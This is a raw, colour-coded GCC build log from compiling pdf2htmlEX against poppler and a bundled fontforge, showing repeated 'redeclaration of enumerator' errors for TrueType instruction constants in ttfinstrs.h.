In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:44:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_else[m[K’ was here
  ttf_div=0x62, ttf_dup=0x20, ttf_eif=0x59, [01;36m[Kttf_else[m[K=0x1b, ttf_endf=0x2d,
                                            [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:59:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_endf[m[K’
  ttf_div=0x62, ttf_dup=0x20, ttf_eif=0x59, ttf_else=0x1b, [01;31m[Kttf_endf[m[K=0x2d,
                                                           [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:34:59:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_endf[m[K’ was here
  ttf_div=0x62, ttf_dup=0x20, ttf_eif=0x59, ttf_else=0x1b, [01;36m[Kttf_endf[m[K=0x2d,
                                                           [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_eq[m[K’
  [01;31m[Kttf_eq[m[K=0x54, ttf_even=0x57, ttf_fdef=0x2c, ttf_flipoff=0x4e, ttf_flipon=0x4d,
  [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_eq[m[K’ was here
  [01;36m[Kttf_eq[m[K=0x54, ttf_even=0x57, ttf_fdef=0x2c, ttf_flipoff=0x4e, ttf_flipon=0x4d,
  [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:15:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_even[m[K’
  ttf_eq=0x54, [01;31m[Kttf_even[m[K=0x57, ttf_fdef=0x2c, ttf_flipoff=0x4e, ttf_flipon=0x4d,
               [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:15:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_even[m[K’ was here
  ttf_eq=0x54, [01;36m[Kttf_even[m[K=0x57, ttf_fdef=0x2c, ttf_flipoff=0x4e, ttf_flipon=0x4d,
               [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:30:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_fdef[m[K’
  ttf_eq=0x54, ttf_even=0x57, [01;31m[Kttf_fdef[m[K=0x2c, ttf_flipoff=0x4e, ttf_flipon=0x4d,
                              [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:30:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_fdef[m[K’ was here
  ttf_eq=0x54, ttf_even=0x57, [01;36m[Kttf_fdef[m[K=0x2c, ttf_flipoff=0x4e, ttf_flipon=0x4d,
                              [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:45:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_flipoff[m[K’
  ttf_eq=0x54, ttf_even=0x57, ttf_fdef=0x2c, [01;31m[Kttf_flipoff[m[K=0x4e, ttf_flipon=0x4d,
                                             [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:45:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_flipoff[m[K’ was here
  ttf_eq=0x54, ttf_even=0x57, ttf_fdef=0x2c, [01;36m[Kttf_flipoff[m[K=0x4e, ttf_flipon=0x4d,
                                             [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:63:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_flipon[m[K’
  ttf_eq=0x54, ttf_even=0x57, ttf_fdef=0x2c, ttf_flipoff=0x4e, [01;31m[Kttf_flipon[m[K=0x4d,
                                                               [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:35:63:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_flipon[m[K’ was here
  ttf_eq=0x54, ttf_even=0x57, ttf_fdef=0x2c, ttf_flipoff=0x4e, [01;36m[Kttf_flipon[m[K=0x4d,
                                                               [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_flippt[m[K’
  [01;31m[Kttf_flippt[m[K=0x80, ttf_fliprgoff=0x82, ttf_fliprgon=0x81, ttf_floor=0x66,
  [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_flippt[m[K’ was here
  [01;36m[Kttf_flippt[m[K=0x80, ttf_fliprgoff=0x82, ttf_fliprgon=0x81, ttf_floor=0x66,
  [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:19:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_fliprgoff[m[K’
  ttf_flippt=0x80, [01;31m[Kttf_fliprgoff[m[K=0x82, ttf_fliprgon=0x81, ttf_floor=0x66,
                   [01;31m[K^~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:19:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_fliprgoff[m[K’ was here
  ttf_flippt=0x80, [01;36m[Kttf_fliprgoff[m[K=0x82, ttf_fliprgon=0x81, ttf_floor=0x66,
                   [01;36m[K^~~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:39:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_fliprgon[m[K’
  ttf_flippt=0x80, ttf_fliprgoff=0x82, [01;31m[Kttf_fliprgon[m[K=0x81, ttf_floor=0x66,
                                       [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:39:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_fliprgon[m[K’ was here
  ttf_flippt=0x80, ttf_fliprgoff=0x82, [01;36m[Kttf_fliprgon[m[K=0x81, ttf_floor=0x66,
                                       [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:58:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_floor[m[K’
  ttf_flippt=0x80, ttf_fliprgoff=0x82, ttf_fliprgon=0x81, [01;31m[Kttf_floor[m[K=0x66,
                                                          [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:36:58:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_floor[m[K’ was here
  ttf_flippt=0x80, ttf_fliprgoff=0x82, ttf_fliprgon=0x81, [01;36m[Kttf_floor[m[K=0x66,
                                                          [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_gc[m[K’
  [01;31m[Kttf_gc[m[K=0x46, ttf_getinfo=0x88, ttf_gfv=0x0d, ttf_gpv=0x0c, ttf_gt=0x52,
  [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_gc[m[K’ was here
  [01;36m[Kttf_gc[m[K=0x46, ttf_getinfo=0x88, ttf_gfv=0x0d, ttf_gpv=0x0c, ttf_gt=0x52,
  [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:15:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_getinfo[m[K’
  ttf_gc=0x46, [01;31m[Kttf_getinfo[m[K=0x88, ttf_gfv=0x0d, ttf_gpv=0x0c, ttf_gt=0x52,
               [01;31m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:15:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_getinfo[m[K’ was here
  ttf_gc=0x46, [01;36m[Kttf_getinfo[m[K=0x88, ttf_gfv=0x0d, ttf_gpv=0x0c, ttf_gt=0x52,
               [01;36m[K^~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:33:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_gfv[m[K’
  ttf_gc=0x46, ttf_getinfo=0x88, [01;31m[Kttf_gfv[m[K=0x0d, ttf_gpv=0x0c, ttf_gt=0x52,
                                 [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:33:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_gfv[m[K’ was here
  ttf_gc=0x46, ttf_getinfo=0x88, [01;36m[Kttf_gfv[m[K=0x0d, ttf_gpv=0x0c, ttf_gt=0x52,
                                 [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:47:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_gpv[m[K’
  ttf_gc=0x46, ttf_getinfo=0x88, ttf_gfv=0x0d, [01;31m[Kttf_gpv[m[K=0x0c, ttf_gt=0x52,
                                               [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:47:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_gpv[m[K’ was here
  ttf_gc=0x46, ttf_getinfo=0x88, ttf_gfv=0x0d, [01;36m[Kttf_gpv[m[K=0x0c, ttf_gt=0x52,
                                               [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:61:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_gt[m[K’
  ttf_gc=0x46, ttf_getinfo=0x88, ttf_gfv=0x0d, ttf_gpv=0x0c, [01;31m[Kttf_gt[m[K=0x52,
                                                             [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:37:61:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_gt[m[K’ was here
  ttf_gc=0x46, ttf_getinfo=0x88, ttf_gfv=0x0d, ttf_gpv=0x0c, [01;36m[Kttf_gt[m[K=0x52,
                                                             [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_gteq[m[K’
  [01;31m[Kttf_gteq[m[K=0x53, ttf_idef=0x89, ttf_if=0x58, ttf_instctrl=0x8e, ttf_ip=0x39,
  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_gteq[m[K’ was here
  [01;36m[Kttf_gteq[m[K=0x53, ttf_idef=0x89, ttf_if=0x58, ttf_instctrl=0x8e, ttf_ip=0x39,
  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:17:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_idef[m[K’
  ttf_gteq=0x53, [01;31m[Kttf_idef[m[K=0x89, ttf_if=0x58, ttf_instctrl=0x8e, ttf_ip=0x39,
                 [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:17:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_idef[m[K’ was here
  ttf_gteq=0x53, [01;36m[Kttf_idef[m[K=0x89, ttf_if=0x58, ttf_instctrl=0x8e, ttf_ip=0x39,
                 [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:32:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_if[m[K’
  ttf_gteq=0x53, ttf_idef=0x89, [01;31m[Kttf_if[m[K=0x58, ttf_instctrl=0x8e, ttf_ip=0x39,
                                [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:32:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_if[m[K’ was here
  ttf_gteq=0x53, ttf_idef=0x89, [01;36m[Kttf_if[m[K=0x58, ttf_instctrl=0x8e, ttf_ip=0x39,
                                [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:45:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_instctrl[m[K’
  ttf_gteq=0x53, ttf_idef=0x89, ttf_if=0x58, [01;31m[Kttf_instctrl[m[K=0x8e, ttf_ip=0x39,
                                             [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:45:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_instctrl[m[K’ was here
  ttf_gteq=0x53, ttf_idef=0x89, ttf_if=0x58, [01;36m[Kttf_instctrl[m[K=0x8e, ttf_ip=0x39,
                                             [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:64:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_ip[m[K’
  ttf_gteq=0x53, ttf_idef=0x89, ttf_if=0x58, ttf_instctrl=0x8e, [01;31m[Kttf_ip[m[K=0x39,
                                                                [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:38:64:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_ip[m[K’ was here
  ttf_gteq=0x53, ttf_idef=0x89, ttf_if=0x58, ttf_instctrl=0x8e, [01;36m[Kttf_ip[m[K=0x39,
                                                                [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_isect[m[K’
  [01;31m[Kttf_isect[m[K=0x0f, ttf_iup=0x30, ttf_jmpr=0x1c, ttf_jrof=0x79, ttf_jrot=0x78,
  [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_isect[m[K’ was here
  [01;36m[Kttf_isect[m[K=0x0f, ttf_iup=0x30, ttf_jmpr=0x1c, ttf_jrof=0x79, ttf_jrot=0x78,
  [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
